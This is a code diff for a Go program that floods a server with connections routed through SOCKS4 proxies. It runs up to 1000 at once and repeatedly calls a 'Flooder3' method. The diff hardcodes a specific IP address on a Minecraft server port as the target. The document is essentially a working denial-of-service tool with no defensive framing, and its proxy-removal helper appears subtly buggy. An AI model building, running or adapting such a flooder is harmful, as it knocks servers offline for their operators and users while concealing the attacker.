@@ -5,17 +5,15 @@ import (
 	"fmt"
 	"go-pen/methods"
 	"log"
-	"net"
 	"os"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 
 	"h12.io/socks"
 )
 
-func checkArguments(cleanArgs []string) (string, int, int) {
+func getArguments(cleanArgs []string) (string, int, int) {
 	argsMessage := "Arguments: <ip:port> <threads> <loop>"
 
 	if len(cleanArgs) < 3 {
@@ -62,50 +60,46 @@ func parseProxies() []string {
 	return proxies
 }
 
-func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error) {
+func remove(s []string, i int) []string {
+	s[i] = s[len(s)-1]
+
+	return s[:len(s)-1]
+}
+
+func connect(proxyAddress string, serverAddress string, proxies []string, i int, data *methods.Data, guard chan struct{}) {
 	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
 
 	dialSocks := socks.Dial(address)
 	conn, err := dialSocks("tcp", serverAddress)
 
-	return conn, err
-}
+	if err != nil {
+		proxies = remove(proxies, i)
+		<-guard
+	} else {
+		for {
+			if methods.Flooder3(data, conn) {
+				<-guard
+				return
+			}
 
-func processProxy(proxies chan string, wg *sync.WaitGroup, address string, data *methods.MethodData) {
-	for proxy := range proxies {
-		var conn, err = makeConnection(proxy, address)
-		if err != nil {
-			//fmt.Println(err)
-		} else {
-			methods.Spigot1(data, conn)
+			time.Sleep(1 * time.Millisecond)
 		}
 	}
-
-	wg.Done()
 }
 
 func main() {
-	var serverAddress, threadCooldown, loop = checkArguments(os.Args[1:])
+	address, cooldown, loop := "193.164.16.163:25565", 5, 1 //getArguments(os.Args[1:])
 
-	fmt.Println(threadCooldown)
+	fmt.Println(cooldown)
 
 	proxies := parseProxies()
-	data := methods.MethodData{Address: serverAddress, Loop: loop}
+	data := methods.Data{Address: address, Loop: loop}
 
-	proxyChan := make(chan string)
-	wg := sync.WaitGroup{}
+	guard := make(chan struct{}, 1000)
 
-	for t := 0; t < len(proxies); t++ {
-		wg.Add(1)
-		go processProxy(proxyChan, &wg, serverAddress, &data)
+	for i, proxy := range proxies {
+		guard <- struct{}{}
+		go connect(proxy, address, proxies, i, &data, guard)
+		//time.Sleep(1 * time.Millisecond)
 	}
-
-	for _, proxy := range proxies {
-		proxyChan <- proxy
-		time.Sleep(1 * time.Millisecond)
-	}
-
-	close(proxyChan)
-
-	wg.Wait()
 }
